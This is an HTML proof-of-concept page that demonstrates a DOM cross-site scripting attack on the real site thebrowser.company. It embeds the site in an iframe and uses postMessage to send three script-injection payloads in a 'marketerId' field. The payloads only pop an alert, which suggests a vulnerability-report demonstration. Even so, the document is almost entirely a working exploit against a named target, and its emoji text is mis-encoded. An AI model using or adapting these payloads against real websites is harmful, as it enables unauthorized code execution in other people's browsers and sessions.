<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>üî• XSS PoC - thebrowser.company</title>
</head>
<body>
  <h1>‚úÖ PoC: DOM XSS via postMessage</h1>
  <p>This page demonstrates a Remote DOM XSS vulnerability in <code>thebrowser.company</code> using <code>postMessage</code>.</p>
  <iframe id="target" src="https://thebrowser.company/" width="100%" height="600" style="border:1px solid #aaa;"></iframe>

  <script>
    const iframe = document.getElementById("target");

    iframe.onload = () => {
      console.log("‚úÖ iframe loaded");

      const payloads = [
        {
          message: "OB_SHOULD_SHOW_PICKER",
          content: {
            marketerId: ["<img src=x onerror=alert(document.domain)>"]
          }
        },
        {
          message: "OB_SHOULD_SHOW_PICKER",
          content: {
            marketerId: ["<script>alert(document.domain)</script>"]
          }
        },
        {
          message: "OB_SHOULD_SHOW_PICKER",
          content: {
            marketerId: ["<svg/onload=alert(document.domain)>"]
          }
        }
      ];

      console.log("üöÄ Sending fuzzed potMessage payloads...");
      payloads.forEach((p, i) => {
        console.log(`üîÅ Sending payload #${i + 1}:`, p);
        iframe.contentWindow.postMessage(p, "*");
      });
    };
  </script>
</body>
</html>
